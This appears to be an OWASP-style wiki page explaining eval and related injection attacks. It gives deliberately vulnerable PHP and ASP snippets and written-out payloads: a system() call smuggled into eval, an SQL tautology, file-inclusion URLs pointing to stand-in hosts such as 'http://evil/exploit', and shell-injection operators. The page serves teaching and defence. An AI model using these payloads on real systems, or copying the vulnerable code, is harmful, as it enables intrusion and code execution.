---

layout: col-sidebar
title: Direct Dynamic Code Evaluation - Eval Injection
author: 
contributors:
permalink: /attacks/Direct_Dynamic_Code_Evaluation_Eval Injection
tags: attack, direct dynamic code evaluation, eval injection
auto-migrated: 1

---

{% include writers.html %}

## Description
This attack consists of a script that does not properly validate user inputs in the page parameter. A remote user can supply a specially crafted URL to pass arbitrary code to an eval() statement, which results in code execution.

Note 1: This attack will execute the code with the same permission like the target web service, including operation system commands.

Note 2: Eval injection is prevalent in handler/dispatch procedures that might want to invoke a large number of functions, or set a large number of variables.

Risk Factors
TBD

Examples
Example 1
In this example an attacker can control all or part of an input string that is fed into an eval() function call

  $myvar = "varname"; 
  $x = $_GET['arg']; 
  eval("\$myvar = \$x;"); 
The argument of "eval" will be processed as PHP, so additional commands can be appended. For example, if "arg" is set to "10 ; system(\"/bin/echo uh-oh\");", additional code is run which executes a program on the server, in this case "/bin/echo".

Example 2
The following is an example of SQL Injection. Consider a web page which has two fields to allow users to enter a Username and a Password. The code behind the page will generate a SQL query to check the Password against the list of Usernames:

SELECT UserList.Username
FROM UserList
WHERE
UserList.Username = 'Username'
AND UserList.Password = 'Password'
If this query returns exactly one row, then access is granted. However, if a malicious user enters a valid Username and injects some valid code ("' OR 1=1") in the Password field, then the resulting query will look like this:

SELECT UserList.Username
FROM UserList
WHERE
UserList.Username = 'Username'
AND UserList.Password = 'Password' OR '1'='1'
In the example above, "Password" is assumed to be blank or some innocuous string. "1=1" will always be true and many rows will be returned, thereby allowing access. The final inverted comma will be ignored by the SQL parser. The technique may be refined to allow multiple statements to run, or even to load up and run external programs.

Example 3
This is an example of a file that was injected. Consider this PHP program (which includes a file specified by request):

<?php
   $color = 'blue';
   if ( isset( $_GET['COLOR'] ) )
      $color = $_GET['COLOR'];
   require( $color . '.php' );
?>
<form>
   <select name="COLOR">
      <option value="red">red</option>
      <option value="blue">blue</option>
   </select>
   <input type="submit">
</form>

The developer thought this would ensure that only blue.php and red.php could be loaded. But as anyone can easily insert arbitrary values in COLOR, it is possible to inject code from files:

/vulnerable.php?COLOR=http://evil/exploit - injects a remotely hosted file containing an exploit.
/vulnerable.php?COLOR=C:\ftp\upload\exploit - injects an uploaded file containing an exploit.
/vulnerable.php?COLOR=..\..\..\..\ftp\upload\exploit - injects an uploaded file containing an exploit, using Path Traversal.
/vulnerable.php?COLOR=C:\notes.txt%00 - example using Null character, Meta character to remove the .php suffix, allowing access to other files than .php. (PHP setting "magic_quotes_gpc = On", which is default, would stop this attack)
Example 4
A simple URL which demonstrates a way to do this attack:

 http://some-page/any-dir/index.php?page=<?include($s);?>&s=http://malicious-page/cmd.txt?  
Example 5
Shell Injection applies to most systems which allow software to programmatically execute a Command line. Typical sources of Shell Injection are calls system(), StartProcess(), java.lang.Runtime.exec() and similar APIs.

Consider the following short PHP program, which runs an external program called funnytext to replace a word the user sent with some other word.

<HTML>
<?php
passthru ( " /home/user/phpguru/funnytext " 
           . $_GET['USER_INPUT'] );
?>
This program can be injected in multiple ways:

`command` will execute command.
$(command) will execute command.
; command will execute command, and output result of command.
| command will execute command, and output result of command.
&& command will execute command, and output result of command.
|| command will execute command, and output result of command.
> /home/user/phpguru/.bashrc will overwrite file .bashrc.
< /home/user/phpguru/.bashrc will send file .bashrc as input to funnytext.
PHP offers escapeshellarg() and escapeshellcmd() to perform encoding before calling methods. However, it is not recommended to trust these methods to be secure - also validate/sanitize input.

Example 6
The following code is vulnerable to eval() injection, because it don’t sanitize the user’s input (in this case: “username”). The program just saves this input in a txt file, and then the server will execute this file without any validation. In this case the user is able to insert a command instead of a username.

Example:

<%
	If not isEmpty(Request( "username" ) ) Then
		Const ForReading = 1, ForWriting = 2, ForAppending = 8
		Dim fso, f
		Set fso = CreateObject("Scripting.FileSystemObject")
		Set f = fso.OpenTextFile(Server.MapPath( "userlog.txt" ), ForAppending, True)
		f.Write Request("username") & vbCrLf
		f.close
		Set f = nothing
		Set fso = Nothing
		%>
		<h1>List of logged users:</h1>
		<pre>
		<%
			Server.Execute( "userlog.txt" )
		%>
		</pre>
		<%
	Else
		%>
		<form>
			<input name="username" /><input type="submit" name="submit" />
		</form>
		<%
	End If
%>
Related Threat Agents
Internal software developer
Related Attacks
Direct Static Code Injection
Code Injection
Injection Attacks
Related Vulnerabilities
Category:Input Validation Vulnerability
Related Controls
Category:Input Validation
References
http://secunia.com/cve_reference/CVE-2006-2005/?show_result=1
http://en.wikipedia.org/wiki/Code_injection